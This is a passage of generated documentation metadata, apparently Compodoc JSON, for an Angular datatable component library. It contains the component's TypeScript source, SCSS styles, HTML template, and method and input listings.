                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "scrollBodyAndHeader",
                    "args": [
                        {
                            "name": "event",
                            "type": "Event"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 324,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "Event",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "scrollTo",
                    "args": [
                        {
                            "name": "item",
                            "type": "T | number"
                        },
                        {
                            "name": "behaviour",
                            "type": "ScrollBehavior",
                            "defaultValue": "'smooth'"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 292,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "item",
                            "type": "T | number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "behaviour",
                            "type": "ScrollBehavior",
                            "defaultValue": "'smooth'",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "scrollToIndex",
                    "args": [
                        {
                            "name": "index",
                            "type": "number"
                        },
                        {
                            "name": "behaviour",
                            "type": "ScrollBehavior"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 286,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "index",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "behaviour",
                            "type": "ScrollBehavior",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setAutoSize",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 305,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "setHeaderScroll",
                    "args": [
                        {
                            "name": "event",
                            "type": "Event"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 318,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "Event",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "sort",
                    "args": [
                        {
                            "type": "literal type"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 329,
                    "jsdoctags": [
                        {
                            "type": "literal type",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "trackColumnsFn",
                    "args": [
                        {
                            "name": "index",
                            "type": "number"
                        },
                        {
                            "name": "item",
                            "type": "Column"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 243,
                    "jsdoctags": [
                        {
                            "name": "index",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "item",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ContentChild,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnDestroy,\n  Output,\n  TemplateRef,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Column, ColumnDisplay, ColumnGroup } from './columns';\nimport { HeaderContextMenu, RowActivation, RowContextMenu, RowSelection } from './events';\nimport { StoDatatableBodyComponent } from './sto-datatable-body/sto-datatable-body.component';\nimport { fromEvent, Observable, of } from 'rxjs';\nimport { debounceTime, map, startWith, tap } from 'rxjs/operators';\nimport { SelectionModes } from './selection-modes';\nimport { rowClassFn, SortColumn } from './models';\nimport { StoDatatableActionsComponent } from './sto-datatable-actions/sto-datatable-actions.component';\n\n@Component({\n  selector: 'sto-datatable',\n  templateUrl: './sto-datatable.component.html',\n  styleUrls: [ './sto-datatable.component.scss', './sto-datatable-progress-bar.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class StoDatatableComponent<T extends Record<string, unknown>> implements AfterViewInit, OnDestroy {\n\n  @Input()\n  get height() {\n    return this._height;\n  }\n\n  set height(height: number) {\n    this._height = height;\n    if ( !this.autoSize ) {\n      this.height$ = of(height);\n    }\n  }\n\n  get bodyHeight() {\n    if ( !this.height || !this.body ) {\n      return null;\n    }\n    const hasHeader = !this.responsive || ( this.responsive && !this.smallScreen );\n    const hasFooter = this.footerRow && ( !this.responsive || ( this.responsive && !this.smallScreen ) );\n    const hasHeaderGroup = ( !this.responsive || ( this.responsive && !this.smallScreen ) ) && this.columnGroups;\n    const headerOffset = hasHeader ? this.headerHeight : 0;\n    const actionsHeight = this.actions ? this.actions.height : 0;\n    let footerOffset = 0;\n    if ( hasFooter && this.footerRow instanceof Array ) {\n      footerOffset = this.rowHeight * this.footerRow.length;\n    } else if ( hasFooter ) {\n      footerOffset = this.rowHeight;\n    }\n    const groupOffset = hasHeaderGroup ? this.headerHeight : 0;\n    return this.height - headerOffset - footerOffset - groupOffset - actionsHeight;\n  }\n\n  @Input()\n  set rows(rows: T[]) {\n    this._rows = rows;\n    let sortedRows = [...(rows || [])];\n    if (!this.preserveSort) {\n      this.activeSort = null;\n    }\n\n    if (this.activeSort) {\n      const column = this.columns.find(col => col.$$id === this.activeSort?.id);\n      const sortDir = this.activeSort.sortDir;\n      if (column) {\n          const fn = column.sortFn || this.defaultSortFn;\n          sortedRows = [ ...rows ].sort((a, b) => fn(a, b, column));\n        if ( sortDir === 'desc' ) {\n          sortedRows.reverse();\n        }\n      }\n    }\n\n    this.rowTotalHeight = ( rows || [] ).length * this.rowHeight;\n    this._internalRows = [...( sortedRows || [] )];\n  }\n\n  get rows() {\n    return this._internalRows;\n  }\n\n  @Input('footerRow')\n  get footerRow() {\n    if ( this._footerRow && typeof this._footerRow === 'object' ) {\n      if ( this._footerRow instanceof Array ) {\n        return this._footerRow;\n      }\n      return [ this._footerRow ];\n    }\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  set footerRow(row: any) {\n    this._footerRow = row;\n  }\n\n  @Input()\n  get columnMode(): ColumnDisplay {\n    return this._columnMode || ColumnDisplay.Flex;\n  }\n\n  set columnMode(columnMode: ColumnDisplay) {\n    this._columnMode = columnMode;\n  }\n\n  @Input()\n  get columns(): Column[] {\n    return this._columns;\n  }\n\n  set columns(columns: Column[]) {\n    if ( columns ) {\n      this._columns = columns\n        .map((column, index) => ( {\n          ...column,\n          $$id: btoa(`${column.prop}${column.name}${index}`)\n        } ));\n      this.columnTotalWidth = columns.map(c => c.flexBasis || 80).reduce((a, b) => a + b, 0);\n    }\n  }\n\n  get width() {\n    if ( this.scrollbarH && this.columns ) {\n      const widthOffset = this.bodyHeight && this.rowTotalHeight > this.bodyHeight ? 12 : 0;\n      return `${this.columnTotalWidth + widthOffset}px`;\n    }\n    return 'auto';\n  }\n\n  @ViewChild(StoDatatableBodyComponent)\n  body: StoDatatableBodyComponent<T>;\n  @ContentChild(StoDatatableActionsComponent)\n  actions: StoDatatableActionsComponent;\n  @Input()\n  rowHeight = 36;\n  @Input()\n  scrollbarH: boolean;\n  @Input()\n  emptyMessage = `No records in set`;\n  @Input()\n  headerHeight = 24;\n  @Input()\n  selectionMode: SelectionModes = SelectionModes.Click;\n  @Input()\n  sortable: boolean;\n  @Input()\n  disableRipple: boolean;\n\n  ColumnDisplay = ColumnDisplay;\n\n  private _height: number;\n  @Input()\n  loading: boolean;\n  public height$: Observable<number>;\n  public rowTotalHeight: number;\n\n  @Input()\n  autoSize: boolean;\n  @Input()\n  autoSizeOffset = 0;\n  @Input()\n  preserveSort: boolean;\n\n  private _rows: T[];\n  private _internalRows: T[];\n  @Input()\n  selected: T;\n\n  private _footerRow: T;\n\n  @Input()\n  virtualScroll = true;\n\n  private _columnMode: ColumnDisplay;\n\n  @Input()\n  responsive: boolean;\n  @Input()\n  responsiveView: TemplateRef<unknown>;\n  @Input()\n  responsiveBreakPoint = 400;\n  public smallScreen: boolean;\n\n  @Input()\n  rowClass: rowClassFn;\n\n  @HostBinding('class.mat-elevation-z3')\n  @Input()\n  elevation = true;\n\n  @Input()\n  columnGroups: ColumnGroup[];\n\n  private _columns: Column[];\n  // eslint-disable-next-line @angular-eslint/no-output-native\n  @Output()\n  select = new EventEmitter<RowSelection<T>>();\n  @Output()\n  resized = new EventEmitter<Column>();\n  @Output()\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\n  @Output()\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\n  @Output()\n  rowActivate = new EventEmitter<RowActivation<T>>();\n  @Input()\n  resizeable: boolean;\n\n  private resizeTimeout: number | undefined;\n  public columnTotalWidth: number;\n\n  public scrollLeft = 'translate3d(0px, 0px, 0px)';\n  public scrollNum: number;\n  public activeSort: SortColumn | null;\n\n  constructor(private elRef: ElementRef, private cdr: ChangeDetectorRef) {\n  }\n\n\n  @Input()\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  trackBy = (index: number, item: T) => {\n    return index;\n  };\n\n  rowClick(row: T, index: number, event: MouseEvent) {\n    this.selected = row;\n    this.select.emit({ row, index, event });\n  }\n\n  trackColumnsFn(index: number, item: Column) {\n    return item.$$id;\n  }\n\n  ngAfterViewInit() {\n    if ( this.autoSize ) {\n      this.setAutoSize();\n    }\n    if ( this.responsive && !this.responsiveView ) {\n      console.error('Responsive mode set to true, but no view passed in. Please pass in responsiveView (templateRef)');\n      this.responsive = false;\n    } else if ( this.responsive ) {\n      new ResizeObserver(entries => {\n        if ( this.resizeTimeout ) {\n          clearTimeout(this.resizeTimeout);\n        }\n        this.resizeTimeout = setTimeout(() => {\n          for ( const entry of entries ) {\n            const cr = entry.contentRect;\n            const { width } = cr;\n            const smallScreen = width < this.responsiveBreakPoint;\n            if ( this.smallScreen !== smallScreen ) {\n              this.smallScreen = smallScreen;\n              requestAnimationFrame(() => {\n                try {\n                  this.cdr.markForCheck();\n                  this.cdr.detectChanges();\n                } catch { /** them all */\n                }\n              });\n            }\n          }\n        }, 15);\n      }).observe(this.elRef.nativeElement);\n    }\n  }\n\n  ngOnDestroy(): void {\n    if ( this.resizeTimeout ) {\n      clearTimeout(this.resizeTimeout);\n    }\n  }\n\n  private scrollToIndex(index: number, behaviour: ScrollBehavior) {\n    if ( this.body.vScroller ) {\n      this.body.vScroller.scrollToIndex(index, behaviour);\n    }\n  }\n\n  public scrollTo(item: T | number, behaviour: ScrollBehavior = 'smooth') {\n    if ( this.body.vScroller ) {\n      if ( typeof item === 'number' ) {\n        this.scrollToIndex(item, behaviour);\n      } else {\n        const index = this.rows.indexOf(item);\n        if ( index >= 0 ) {\n          this.scrollToIndex(index, behaviour);\n        }\n      }\n    }\n  }\n\n  private setAutoSize() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.height$ = fromEvent(window, 'resize')\n      .pipe(\n        startWith(null),\n        debounceTime(20), // ~1 animation frame\n        map(() => el.getBoundingClientRect()),\n        map(rect => rect.top),\n        map(top => window.innerHeight - top - 16 - this.autoSizeOffset - ( this.actions ? 6 : 0 )),\n        tap(height => this.height = height)\n      );\n  }\n\n  setHeaderScroll(event: Event) {\n    const left = (event.target as HTMLElement).scrollLeft;\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\n    this.cdr.detectChanges();\n  }\n\n  scrollBodyAndHeader(event: Event) {\n    const left = (event.target as HTMLElement).scrollLeft;\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\n  }\n\n  sort({ column, sortDir }: { column: Column, sortDir: 'asc' | 'desc' | null }) {\n    if ( sortDir === null ) {\n      this._internalRows = [ ...this._rows ];\n      this.activeSort = null;\n      return;\n    }\n    this.activeSort = { id: column.$$id || '', sortDir };\n    const fn = column.sortFn || this.defaultSortFn;\n    const rows = [ ...this._rows ].sort((a, b) => fn(a, b, column));\n    if ( sortDir === 'desc' ) {\n      rows.reverse();\n    }\n    this._internalRows = rows;\n    this.cdr.detectChanges();\n    this.cdr.markForCheck();\n  }\n\n  private defaultSortFn(a: T, b: T, col: Column) {\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const aValue = a[ col.prop ];\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const bValue = b[ col.prop ];\n    switch ( typeof aValue ) {\n      case 'string':\n        return aValue.localeCompare(bValue as string);\n      case 'number':\n        return aValue - (bValue as number);\n      default:\n        return 0;\n    }\n  }\n\n  onResize({ columns, column }: { columns: Column[], column: Column }) {\n    this.columns = [ ...columns ]\n      .map(c => {\n        // Disallow grow/shrink if resizing\n        c.flexGrow = 0;\n        c.flexShrink = 0;\n        return c;\n      });\n    this.resized.emit(column);\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "@import \"./sto-datatable-mixins\";\n\n$space: 4px;\n$space-2x: $space * 2;\n\n$datatable-header-vertical-padding: $space-2x;\n$datatable-header-horizontal-padding: $space-2x;\n$datatable-header-font-size: 11px;\n$datatable-vertical-padding: $space-2x;\n$datatable-horizontal-padding: $space-2x;\n\n$content-height: 20px;\n\n.sto-mdl-table {\n  transition: height 225ms cubic-bezier(0.4, 0.0, 0.2, 1);\n  position: relative;\n  width: 100%;\n  border-collapse: collapse;\n  white-space: nowrap;\n\n  &__row--scroll-offset {\n    padding-right: 12px;\n  }\n\n  &__actions {\n    display: flex;\n    align-items: center;\n    justify-content: space-between;\n\n    &__left {\n      display: flex;\n      flex: 1 1 auto;\n    }\n\n    &__right {\n      display: flex;\n      flex: 1 1 auto;\n      justify-content: flex-end;\n    }\n  }\n\n  &__header {\n    &__row {\n      display: flex;\n      align-items: center;\n\n      &__cell {\n        height: 100%;\n        font-weight: 400;\n        flex: 1 0 50px;\n        overflow: hidden;\n        text-align: left;\n        padding: 0 $datatable-horizontal-padding;\n        position: relative;\n        vertical-align: bottom;\n        text-overflow: ellipsis;\n        box-sizing: border-box;\n\n        &__content {\n          flex: 1 1 auto;\n        }\n\n        &__resize-handle {\n          flex: 0 0 9px;\n          visibility: hidden;\n          cursor: col-resize;\n          position: relative;\n        }\n\n        &:hover &__resize-handle {\n          visibility: visible;\n        }\n      }\n    }\n  }\n\n  &__header-group {\n    &__cell {\n      position: absolute;\n      overflow: hidden;\n    }\n  }\n\n  &__body {\n    &--scrollbar-h {\n      .cdk-virtual-scroll-content-wrapper {\n        width: fit-content;\n      }\n    }\n  }\n\n  &__body, &__footer {\n    &--selectable &__row {\n      cursor: pointer;\n    }\n\n    &__row {\n      display: flex;\n      position: relative;\n      align-items: center;\n      outline: none;\n\n      &--selected {\n        box-shadow: -1px 1px 0px 0px rgba(0, 0, 0, .26) inset, 1px -1px 0px 0 rgba(0, 0, 0, .26) inset\n      }\n\n\n      &__cell {\n        flex: 1 0 50px;\n        overflow: hidden;\n        text-align: left;\n        padding: 0 $datatable-horizontal-padding;\n        position: relative;\n        vertical-align: middle;\n        box-sizing: border-box;\n        transition: flex-basis 100ms linear;\n\n        span {\n          overflow: hidden;\n          white-space: nowrap;\n          text-overflow: ellipsis;\n          display: block;\n        }\n      }\n    }\n  }\n\n  &__body--empty {\n    margin: 8px;\n  }\n\n  &__body--no-vscroll {\n    overflow-y: auto;\n  }\n}\n\n\nsto-datatable {\n  display: block;\n}\n\nsto-datatable .cdk-virtual-scroll-content-wrapper {\n  position: static;\n}\n\n.sto-card.sto-card--table {\n  sto-datatable {\n    margin: 0 -8px;\n\n    .sto-mdl-table__header__row__cell, .sto-mdl-table__body__row__cell, .sto-mdl-table__footer__row__cell {\n      &:first-of-type {\n        margin-left: 8px;\n      }\n\n      &:last-of-type {\n        margin-right: 8px;\n      }\n    }\n  }\n}\n\n\n",
                    "styleUrl": "./sto-datatable.component.scss"
                },
                {
                    "data": ".sto-mdl-table {\n  &__progress-bar {\n    display: block;\n    width: 100%;\n    height: 5px;\n    padding: 0;\n    margin: -5px 0 0 0;\n    position: absolute;\n\n    &__container {\n      display: block;\n      position: relative;\n      overflow: hidden;\n      width: 100%;\n      height: 5px;\n      -webkit-transform: translate(0, 0) scale(1, 1);\n      transform: translate(0, 0) scale(1, 1);\n      background-color: rgb(170, 209, 249);\n\n      &__bar {\n        transition: all .2s linear;\n        -webkit-animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\n        animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\n\n        transition: -webkit-transform .2s linear;\n        transition: transform .2s linear;\n        background-color: rgb(16, 108, 200);\n\n        position: absolute;\n        left: 0;\n        top: 0;\n        bottom: 0;\n        width: 100%;\n        height: 5px;\n      }\n    }\n  }\n\n  /**\n   * Progress bar animations\n   */\n  @keyframes query {\n    0% {\n      opacity: 1;\n      transform: translateX(35%) scale(.3, 1);\n    }\n\n    100% {\n      opacity: 0;\n      transform: translateX(-50%) scale(0, 1);\n    }\n  }\n\n}\n",
                    "styleUrl": "./sto-datatable-progress-bar.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "elRef",
                        "type": "ElementRef"
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef"
                    }
                ],
                "line": 226,
                "jsdoctags": [
                    {
                        "name": "elRef",
                        "type": "ElementRef",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "cdr",
                        "type": "ChangeDetectorRef",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "accessors": {
                "height": {
                    "name": "height",
                    "setSignature": {
                        "name": "height",
                        "type": "void",
                        "args": [
                            {
                                "name": "height",
                                "type": "number"
                            }
                        ],
                        "returnType": "void",
                        "line": 40,
                        "jsdoctags": [
                            {
                                "name": "height",
                                "type": "number",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "bodyHeight": {
                    "name": "bodyHeight",
                    "getSignature": {
                        "name": "bodyHeight",
                        "type": "",
                        "returnType": "",
                        "line": 47
                    }
                },
                "rows": {
                    "name": "rows",
                    "setSignature": {
                        "name": "rows",
                        "type": "void",
                        "args": [
                            {
                                "name": "rows",
                                "type": "[]"
                            }
                        ],
                        "returnType": "void",
                        "line": 67,
                        "jsdoctags": [
                            {
                                "name": "rows",
                                "type": "[]",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "rows",
                        "type": "",
                        "returnType": "",
                        "line": 90
                    }
                },
                "footerRow": {
                    "name": "footerRow",
                    "setSignature": {
                        "name": "footerRow",
                        "type": "void",
                        "args": [
                            {
                                "name": "row",
                                "type": "any"
                            }
                        ],
                        "returnType": "void",
                        "line": 105,
                        "jsdoctags": [
                            {
                                "name": "row",
                                "type": "any",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "columnMode": {
                    "name": "columnMode",
                    "setSignature": {
                        "name": "columnMode",
                        "type": "void",
                        "args": [
                            {
                                "name": "columnMode",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 114,
                        "jsdoctags": [
                            {
                                "name": "columnMode",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "columns": {
                    "name": "columns",
                    "setSignature": {
                        "name": "columns",
                        "type": "void",
                        "args": [
                            {
                                "name": "columns",
                                "type": "[]"
                            }
                        ],
                        "returnType": "void",
                        "line": 123,
                        "jsdoctags": [
                            {
                                "name": "columns",
                                "type": "[]",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "width": {
                    "name": "width",
                    "getSignature": {
                        "name": "width",
                        "type": "",
                        "returnType": "",
                        "line": 134
                    }
                }
            },
            "templateData": "<div class=\"sto-mdl-table\"\n     [class.sto-mdl-table--force-width]=\"columnMode === ColumnDisplay.Force\"\n     [style.height.px]=\"height$ | async\">\n  <ng-content select=\"sto-datatable-actions\"></ng-content>\n  <sto-datatable-header-group *ngIf=\"(!responsive || (responsive && !smallScreen)) && columnGroups && this.scrollbarH\"\n                              [width]=\"width\"\n                              [height]=\"headerHeight\"\n                              [transform]=\"scrollLeft\"\n                              [columns]=\"columns\"\n                              [groups]=\"columnGroups\"></sto-datatable-header-group>\n  <sto-datatable-header [responsive]=\"responsive\"\n                        [columnMode]=\"columnMode\"\n                        (resized)=\"onResize($event)\"\n                        [resizeable]=\"resizeable && scrollbarH\"\n                        [smallScreen]=\"smallScreen\"\n                        [headerHeight]=\"headerHeight\"\n                        [offset]=\"bodyHeight && rowTotalHeight > bodyHeight ? 12 : 0\"\n                        [width]=\"width\"\n                        [scrollLeft]=\"scrollLeft\"\n                        [bodyHeight]=\"bodyHeight\"\n                        [rows]=\"rows\"\n                        [rowHeight]=\"rowHeight\"\n                        [columns]=\"columns\"\n                        [activeSortId]=\"activeSort?.id\"\n                        [sortable]=\"sortable\"\n                        (sort)=\"sort($event)\"\n                        (headerContextMenu)=\"headerContextMenu.emit($event)\"></sto-datatable-header>\n  <div class=\"sto-mdl-table__progress-bar\"\n       *ngIf=\"loading\"\n       role=\"progressbar\">\n    <div class=\"sto-mdl-table__progress-bar__container\">\n      <div class=\"sto-mdl-table__progress-bar__container__bar\"></div>\n    </div>\n  </div>\n  <div class=\"sto-mdl-table__body--empty\"\n       *ngIf=\"!rows || rows.length === 0\">\n    {{ emptyMessage }}\n  </div>\n  <sto-datatable-body #body\n                      [disableRipple]=\"disableRipple || select.observers.length === 0\"\n                      [columnMode]=\"columnMode\"\n                      [width]=\"scrollbarH ? columnTotalWidth + 'px' : 'auto'\"\n                      [selectable]=\"!!select.observers.length\"\n                      [rows]=\"rows\"\n                      [rowClass]=\"rowClass\"\n                      [scrollLeft]=\"scrollbarH && footerRow ? scrollLeft : null\"\n                      [selectionMode]=\"selectionMode\"\n                      [scrollbarH]=\"footerRow ? false : scrollbarH\"\n                      [trackBy]=\"trackBy\"\n                      [virtualScroll]=\"virtualScroll\"\n                      [height]=\"bodyHeight\"\n                      [rowHeight]=\"rowHeight\"\n                      (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                      (activate)=\"rowActivate.emit($event)\"\n                      (rowSelected)=\"select.emit($event)\"\n                      [columns]=\"columns\"\n                      (scrollHeader)=\"setHeaderScroll($event)\"\n                      [responsive]=\"responsive\"\n                      [responsiveView]=\"responsiveView\"\n                      [smallView]=\"smallScreen\"\n                      [hasFooter]=\"!!footerRow\"\n                      [selected]=\"selected\"></sto-datatable-body>\n  <div class=\"sto-mdl-table__footer\"\n       [style.overflowY]=\"'hidden'\"\n       [style.overflowX]=\"'auto'\"\n       (scroll)=\"scrollBodyAndHeader($event)\"\n       [style.width]=\"'calc(100% - ' + body.verticalScrollOffset + 'px)'\"\n       *ngIf=\"footerRow && (!responsive || (responsive && !smallScreen))\">\n    <div class=\"sto-mdl-table__footer__row\"\n         [class.sto-mdl-table__row--scroll-offset]=\"scrollbarH && !!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\"\n         *ngFor=\"let row of footerRow; let i = index\"\n         [style.min-width]=\"width\"\n         [style.overflowY]=\"'hidden'\"\n         [style.height]=\"rowHeight + 'px'\">\n      <div class=\"sto-mdl-table__footer__row__cell\"\n           [ngStyle]=\"column | columnStyle:columnMode\"\n           *ngFor=\"let column of columns; trackBy: trackColumnsFn\">\n        <span *ngIf=\"!column.footerTemplate\">\n          {{ row[column.prop] }}\n        </span>\n        <ng-template #footerTemplate\n                     *ngIf=\"column.footerTemplate\"\n                     [ngTemplateOutlet]=\"column.footerTemplate\"\n                     [ngTemplateOutletContext]=\"{column: column, value: row[column.prop], index: i}\">\n        </ng-template>\n      </div>\n    </div>\n  </div>\n</div>\n<ng-content select=\"mat-paginator\"></ng-content>\n\n"
        },
        {
            "name": "StoDatatableHeaderComponent",
            "id": "component-StoDatatableHeaderComponent-f70505aa07298ee227fd39545c5968bf",
            "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-datatable-header",
            "styleUrls": [
                "./sto-datatable-header.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./sto-datatable-header.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "activeSortId",
                    "line": 50,
                    "type": "string | undefined"
                },
                {
                    "name": "bodyHeight",
                    "line": 40,
                    "type": "number | null"
                },
                {
                    "name": "columnMode",
                    "line": 52,
                    "type": "ColumnDisplay"
                },
                {
                    "name": "columns",
                    "line": 46,
                    "type": "Column[]"
                },
                {
                    "name": "headerHeight",
                    "line": 30,
                    "type": "number"
                },
                {
                    "name": "offset",
                    "line": 36,
                    "type": "number"
                },
                {
                    "name": "resizeable",
                    "line": 32,
                    "type": "boolean"
                },
                {
                    "name": "responsive",
                    "line": 26,
                    "type": "boolean"
                },
                {
                    "name": "rowHeight",
                    "line": 44,
                    "type": "number"
                },
                {
                    "name": "rows",
                    "line": 42,
                    "type": "T[]"
                },
                {
                    "name": "scrollLeft",
                    "line": 38,
                    "type": "string"
                },
                {
                    "name": "smallScreen",
                    "line": 28,
                    "type": "boolean"
                },
                {
                    "name": "sortable",
                    "line": 48,
                    "type": "boolean"
                },
                {
                    "name": "width",
                    "line": 34,
                    "type": "string"
                }
            ],
            "outputsClass": [
                {
                    "name": "headerContextMenu",
                    "defaultValue": "new EventEmitter<HeaderContextMenu>()",
                    "line": 65,
                    "type": "EventEmitter"
                },
                {
                    "name": "resized",
                    "defaultValue": "new EventEmitter<{ columns: Column[], column: Column }>()",
                    "line": 59,
                    "type": "EventEmitter"
                },
                {
                    "name": "sort",
                    "defaultValue": "new EventEmitter<{ column: Column, sortDir: 'asc' | 'desc' | null }>()",
                    "line": 67,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "ColumnDisplay",
                    "defaultValue": "ColumnDisplay",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 53
                },
                {
                    "name": "headerWidthMap",
                    "defaultValue": "{}",
                    "type": "Record<number | number>",
                    "optional": false,
                    "description": "",
                    "line": 56,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "sortDirection",
                    "type": "\"asc\" | \"desc\" | null",
                    "optional": false,
                    "description": "",
                    "line": 61,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "tempWidth",
                    "type": "string | null",
                    "optional": false,
                    "description": "",
                    "line": 54,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "onResize",
                    "args": [
                        {
                            "name": "column",
                            "type": "Column"
                        },
                        {
                            "name": "flexBasis",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 87,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "column",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "flexBasis",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "onResizeEnd",
                    "args": [
                        {
                            "name": "col",
                            "type": "Column"
                        },
                        {
                            "name": "flexBasis",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 103,
                    "jsdoctags": [
                        {
                            "name": "col",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "flexBasis",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "sortByColumn",
                    "args": [
                        {
                            "name": "column",
                            "type": "Column"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 73,
                    "jsdoctags": [
                        {
                            "name": "column",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "trackColumnsFn",
                    "args": [
                        {
                            "name": "index",
                            "type": "number"
                        },
                        {
                            "name": "item",
                            "type": "Column"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 69,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "name": "index",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "item",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
